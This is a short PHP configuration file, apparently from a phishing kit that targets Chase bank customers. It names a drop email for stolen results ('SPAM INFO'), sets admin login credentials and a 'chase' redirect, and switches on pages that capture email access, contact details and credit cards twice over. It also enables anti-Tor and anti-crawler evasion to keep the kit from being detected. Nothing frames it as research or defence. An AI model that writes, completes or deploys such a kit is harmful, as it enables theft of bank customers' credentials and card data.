<?php


// SPAM INFO

$yourname = "Tonyspam";
$your_email = "wilson1025555@yandex.com";


// LOGIN INFO

$username = "admin";
$password = "Tonyspam01";

// Redirect

$redirect = "chase";


// ON / OFF 
$double_login = "yes";
$double_access = "yes";
$api_protection = "yes";
$redirection = "yes";
$double_cc = "yes";
$one_time_access ="yes";
$show_start_page = "no"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";
$anti_proxy = "no";
$anti_vpn = "no";
$anti_tor = "yes";
$anti_web_crawler ="yes";
$max_fraud_score = "101";


// KEY PROTECTION
$Key = "MB2GhIkLGWAkgirr54WrVRyDMibLfq1v";





?>